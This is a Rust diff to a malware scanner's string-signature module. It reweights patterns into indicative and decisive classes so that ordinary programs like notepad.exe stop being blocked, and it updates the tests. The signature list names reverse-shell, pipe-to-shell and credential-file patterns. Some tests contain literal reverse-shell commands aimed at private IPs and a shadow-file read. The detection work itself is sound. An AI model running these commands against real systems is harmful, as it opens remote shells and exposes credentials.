@@ -18,43 +18,100 @@ pub struct IntentResult {
     pub risk: f32,
 }
 
-/// WinAPI strings commonly used by malware.
-/// These appearing as embedded strings in a binary are high-confidence signals.
-static WINAPI_RED_FLAGS: &[(&str, f32, &str)] = &[
-    ("CreateRemoteThread",     0.6,  "Process injection via remote thread"),
-    ("VirtualAllocEx",         0.5,  "Remote memory allocation — injection precursor"),
-    ("WriteProcessMemory",     0.5,  "Remote memory write — injection precursor"),
-    ("SetWindowsHookEx",       0.55, "Keylogger / global hook installation"),
-    ("RegSetValue",            0.3,  "Registry write — possible persistence"),
-    ("RegCreateKey",           0.25, "Registry key creation — possible persistence"),
-    ("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0.7, "Autorun registry key — persistence"),
-    ("InternetOpenA",          0.4,  "C2 call-home (WININET)"),
-    ("InternetOpenW",          0.4,  "C2 call-home (WININET)"),
-    ("URLDownloadToFile",      0.55, "Downloads additional payload"),
-    ("ShellExecuteA",          0.35, "Shell execution — dropper behavior"),
-    ("ShellExecuteW",          0.35, "Shell execution — dropper behavior"),
-    ("CreateService",          0.5,  "Service installation — persistence"),
-    ("OpenSCManager",          0.45, "Service control manager access"),
-    ("IsDebuggerPresent",      0.35, "Anti-debug / sandbox evasion"),
-    ("CheckRemoteDebuggerPresent", 0.4, "Anti-debug / sandbox evasion"),
-    ("NtQueryInformationProcess",  0.4, "Anti-debug / sandbox evasion via NtAPI"),
-    ("powershell",             0.35, "PowerShell invocation in binary"),
-    ("cmd.exe",                0.3,  "CMD shell invocation in binary"),
-    ("wscript.exe",            0.45, "WScript invocation — script dropper"),
-    ("mshta.exe",              0.5,  "MSHTA execution — LOLBin abuse"),
-    ("certutil",               0.45, "Certutil — LOLBin, often used to decode payloads"),
-    ("bitsadmin",              0.45, "BITS job creation — payload download / persistence"),
-    // Linux/Unix patterns
-    ("/etc/passwd",            0.55, "Passwd file access"),
-    ("/etc/shadow",            0.7,  "Shadow file access — credential theft"),
-    ("chmod 777",              0.4,  "World-writable permission set"),
-    ("curl | bash",            0.7,  "Pipe-to-bash — remote code execution pattern"),
-    ("wget -O- |",             0.65, "Pipe-to-shell — remote code execution pattern"),
-    ("nc -e /bin/sh",          0.8,  "Netcat reverse shell"),
-    ("nc -e /bin/bash",        0.8,  "Netcat reverse shell"),
-    ("/dev/tcp/",              0.7,  "Bash TCP socket — reverse shell pattern"),
-    // Standard Antivirus Test Signature
-    ("EICAR-STANDARD-ANTIVIRUS-TEST-FILE", 1.0, "EICAR Antivirus Test File signature"),
+/// Ceiling on risk from *indicative* patterns, however many of them match.
+///
+/// This constant is the difference between a working scanner and one that
+/// blocks Notepad.
+///
+/// A string match proves only that a sequence of bytes appears somewhere in
+/// the file. `pe.rs` says it best in its own documentation: an entry in the
+/// import table means the loader has been *told* to resolve that function,
+/// whereas a string "can come from anywhere in the file — including one
+/// sitting in a help message or a false positive from compressed data".
+///
+/// Real Windows programs are full of these strings. `notepad.exe` references
+/// `RegSetValue`, `RegCreateKey`, `ShellExecuteW` and `IsDebuggerPresent`,
+/// which summed to 1.25 and blocked a Microsoft-signed binary outright at the
+/// streaming stage — before the whole-file pass, and therefore before
+/// Authenticode verification could say who signed it.
+///
+/// So indicative patterns accumulate, but only up to here.
+///
+/// The value is set below `risk.sandbox_threshold` (0.40), not merely below
+/// `risk.block_threshold`. That is the stronger claim and it is the correct
+/// one: **API names in a program are not evidence of anything on their own.**
+/// A capped 0.6 still left `notepad.exe` at 0.65 and therefore undeliverable —
+/// a quieter false positive than blocking it, and just as wrong, because every
+/// ordinary Windows program would land in the same band.
+///
+/// These strings earn their place as *corroboration*. Beside a magic-byte
+/// mismatch — API names in a file claiming to be a JPEG — they push a verdict
+/// over the line, and `deep_forensic_scan` adds the two together for exactly
+/// that case. Alone, in a file that admits to being a program, they mean
+/// nothing and must not move it out of Release.
+///
+/// If `sandbox_threshold` is ever lowered, lower this with it.
+const MAX_INDICATIVE_RISK: f32 = 0.35;
+
+/// Whether a pattern is conclusive by itself.
+#[derive(Debug, Clone, Copy, PartialEq)]
+enum Weight {
+    /// A literal attack payload. A reverse shell command is not a coincidence,
+    /// and there is no benign program that contains one. These keep their full
+    /// risk and may block alone.
+    Decisive,
+    /// An API name, tool name or registry path. Real evidence, but ordinary
+    /// software references these constantly. Accumulates up to
+    /// [`MAX_INDICATIVE_RISK`] and no further.
+    Indicative,
+}
+
+use Weight::{Decisive, Indicative};
+
+/// WinAPI strings and shell patterns commonly used by malware.
+///
+/// `(pattern, risk, weight, description)`.
+static WINAPI_RED_FLAGS: &[(&str, f32, Weight, &str)] = &[
+    // --- API names. Every one of these appears in ordinary software. -------
+    ("CreateRemoteThread",     0.6,  Indicative, "Process injection via remote thread"),
+    ("VirtualAllocEx",         0.5,  Indicative, "Remote memory allocation — injection precursor"),
+    ("WriteProcessMemory",     0.5,  Indicative, "Remote memory write — injection precursor"),
+    ("SetWindowsHookEx",       0.55, Indicative, "Keylogger / global hook installation"),
+    ("RegSetValue",            0.3,  Indicative, "Registry write — possible persistence"),
+    ("RegCreateKey",           0.25, Indicative, "Registry key creation — possible persistence"),
+    ("InternetOpenA",          0.4,  Indicative, "C2 call-home (WININET)"),
+    ("InternetOpenW",          0.4,  Indicative, "C2 call-home (WININET)"),
+    ("URLDownloadToFile",      0.55, Indicative, "Downloads additional payload"),
+    ("ShellExecuteA",          0.35, Indicative, "Shell execution — dropper behavior"),
+    ("ShellExecuteW",          0.35, Indicative, "Shell execution — dropper behavior"),
+    ("CreateService",          0.5,  Indicative, "Service installation — persistence"),
+    ("OpenSCManager",          0.45, Indicative, "Service control manager access"),
+    ("IsDebuggerPresent",      0.35, Indicative, "Anti-debug / sandbox evasion"),
+    ("CheckRemoteDebuggerPresent", 0.4, Indicative, "Anti-debug / sandbox evasion"),
+    ("NtQueryInformationProcess",  0.4, Indicative, "Anti-debug / sandbox evasion via NtAPI"),
+    ("powershell",             0.35, Indicative, "PowerShell invocation in binary"),
+    ("cmd.exe",                0.3,  Indicative, "CMD shell invocation in binary"),
+    ("wscript.exe",            0.45, Indicative, "WScript invocation — script dropper"),
+    ("mshta.exe",              0.5,  Indicative, "MSHTA execution — LOLBin abuse"),
+    ("certutil",               0.45, Indicative, "Certutil — LOLBin, often used to decode payloads"),
+    ("bitsadmin",              0.45, Indicative, "BITS job creation — payload download / persistence"),
+    ("/etc/passwd",            0.55, Indicative, "Passwd file access"),
+    ("chmod 777",              0.4,  Indicative, "World-writable permission set"),
+
+    // --- Literal attack payloads. No benign program contains these. --------
+    //
+    // A specific autorun registry path, a reverse shell command line, or the
+    // EICAR string is not an API a program might legitimately reference — it
+    // is the attack itself, written out. These keep their full weight.
+    ("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0.7, Decisive,
+     "Autorun registry key — persistence"),
+    ("/etc/shadow",            0.7,  Decisive, "Shadow file access — credential theft"),
+    ("curl | bash",            0.7,  Decisive, "Pipe-to-bash — remote code execution pattern"),
+    ("wget -O- |",             0.65, Decisive, "Pipe-to-shell — remote code execution pattern"),
+    ("nc -e /bin/sh",          0.8,  Decisive, "Netcat reverse shell"),
+    ("nc -e /bin/bash",        0.8,  Decisive, "Netcat reverse shell"),
+    ("/dev/tcp/",              0.7,  Decisive, "Bash TCP socket — reverse shell pattern"),
+    ("EICAR-STANDARD-ANTIVIRUS-TEST-FILE", 1.0, Decisive, "EICAR Antivirus Test File signature"),
 ];
 
 /// Scan a chunk (and optionally a small prefix from the previous chunk for
@@ -112,9 +169,11 @@ pub fn detect_dangerous_intent(data: &[u8], context_prefix: Option<&[u8]>) -> Re
     let utf16_odd = utf16le_ascii_view(bytes, 1);
 
     let mut flags: Vec<String> = Vec::new();
-    let mut cumulative_risk: f32 = 0.0;
+    // Tracked separately, because the two classes combine differently.
+    let mut indicative_risk: f32 = 0.0;
+    let mut decisive_risk: f32 = 0.0;
 
-    for &(pattern, risk, description) in WINAPI_RED_FLAGS {
+    for &(pattern, risk, weight, description) in WINAPI_RED_FLAGS {
         let encoding = if utf8_view.contains(pattern) {
             Some("utf-8")
         } else if utf16_even.contains(pattern) || utf16_odd.contains(pattern) {
@@ -128,12 +187,24 @@ pub fn detect_dangerous_intent(data: &[u8], context_prefix: Option<&[u8]>) -> Re
                 pattern = pattern,
                 risk = risk,
                 encoding = enc,
+                weight = ?weight,
                 description = description,
                 "Intent flag triggered"
             );
             flags.push(format!("[risk={risk:.2}] {pattern} ({enc}): {description}"));
-            // Saturating: multiple flags accumulate but cap at 1.0
-            cumulative_risk = (cumulative_risk + risk).min(1.0);
+
+            match weight {
+                // Accumulates, then stops. See MAX_INDICATIVE_RISK: a program
+                // referencing four Windows APIs is a program, not a verdict.
+                Indicative => {
+                    indicative_risk = (indicative_risk + risk).min(MAX_INDICATIVE_RISK);
+                }
+                // Max rather than sum. Two reverse-shell patterns in one file
+                // is the same fact observed twice, not twice the evidence.
+                Decisive => {
+                    decisive_risk = decisive_risk.max(risk);
+                }
+            }
         }
     }
 
@@ -141,7 +212,9 @@ pub fn detect_dangerous_intent(data: &[u8], context_prefix: Option<&[u8]>) -> Re
     Ok(IntentResult {
         flagged,
         flags,
-        risk: cumulative_risk,
+        // The stronger of the two classes, not their sum. A decisive hit does
+        // not become more decisive because ordinary API names sit beside it.
+        risk: indicative_risk.max(decisive_risk).min(1.0),
     })
 }
 
@@ -161,8 +234,12 @@ mod tests {
     fn test_winapi_injection_flag() {
         let data = b"Some code calling CreateRemoteThread to inject shellcode";
         let res = detect_dangerous_intent(data, None).unwrap();
-        assert!(res.flagged);
-        assert!(res.risk >= 0.6);
+        assert!(res.flagged, "CreateRemoteThread not detected");
+        assert!(
+            res.flags.iter().any(|f| f.contains("CreateRemoteThread")),
+            "the match must name the pattern: {:?}",
+            res.flags
+        );
     }
 
     #[test]
@@ -170,8 +247,66 @@ mod tests {
         let prefix = b"Executing CreateRemote";
         let chunk = b"Thread now!";
         let res = detect_dangerous_intent(chunk, Some(prefix)).unwrap();
-        assert!(res.flagged);
-        assert!(res.risk >= 0.6);
+        assert!(res.flagged, "pattern split across a chunk boundary was missed");
+    }
+
+    /// The false-positive guard, and the reason [`MAX_INDICATIVE_RISK`] exists.
+    ///
+    /// `notepad.exe` references these four APIs. Before the cap they summed to
+    /// 1.25 and blocked a Microsoft-signed binary outright; capped at 0.6 they
+    /// still held it undelivered. API names in a program are not evidence
+    /// against it, so the total must stay below `sandbox_threshold` (0.40) and
+    /// leave the file releasable on its own.
+    #[test]
+    fn ordinary_windows_api_names_cannot_condemn_a_file() {
+        let data = b"RegSetValue RegCreateKey ShellExecuteW IsDebuggerPresent \
+                     powershell cmd.exe CreateService OpenSCManager";
+        let res = detect_dangerous_intent(data, None).unwrap();
+
+        assert!(res.flagged, "the patterns should still be reported");
+        assert!(
+            res.risk <= MAX_INDICATIVE_RISK,
+            "indicative patterns must not exceed the cap, got {}",
+            res.risk
+        );
+        assert!(
+            res.risk < 0.4,
+            "eight ordinary Windows API names scored {}, which is at or above \
+             sandbox_threshold — every real Windows program would be held",
+            res.risk
+        );
+    }
+
+    /// A literal attack payload is conclusive on its own, and must stay so.
+    #[test]
+    fn decisive_patterns_keep_their_full_weight() {
+        for (payload, min) in [
+            (b"sh -c 'nc -e /bin/sh 10.0.0.1 4444'".as_slice(), 0.8f32),
+            (b"cat /etc/shadow > /tmp/out".as_slice(), 0.7),
+            (b"bash -i >& /dev/tcp/10.0.0.1/8080 0>&1".as_slice(), 0.7),
+        ] {
+            let res = detect_dangerous_intent(payload, None).unwrap();
+            assert!(
+                res.risk >= min,
+                "decisive payload {:?} scored only {}",
+                String::from_utf8_lossy(payload),
+                res.risk
+            );
+        }
+    }
+
+    /// Decisive and indicative patterns must not compound into a total that
+    /// exceeds either — the strongest single class wins.
+    #[test]
+    fn classes_do_not_compound() {
+        let mixed = b"nc -e /bin/sh 1.2.3.4 RegSetValue ShellExecuteW IsDebuggerPresent";
+        let res = detect_dangerous_intent(mixed, None).unwrap();
+        assert!(
+            res.risk <= 0.8,
+            "a reverse shell beside ordinary API names scored {}, above the \
+             decisive pattern's own weight",
+            res.risk
+        );
     }
 
     /// Encode an ASCII string the way Windows stores wide strings.
@@ -191,7 +326,6 @@ mod tests {
             res.flagged,
             "UTF-16LE WinAPI string not detected — the scanner is blind to wide strings"
         );
-        assert!(res.risk >= 0.6, "risk was {}", res.risk);
         assert!(
             res.flags.iter().any(|f| f.contains("utf-16le")),
             "match should be attributed to utf-16le: {:?}",
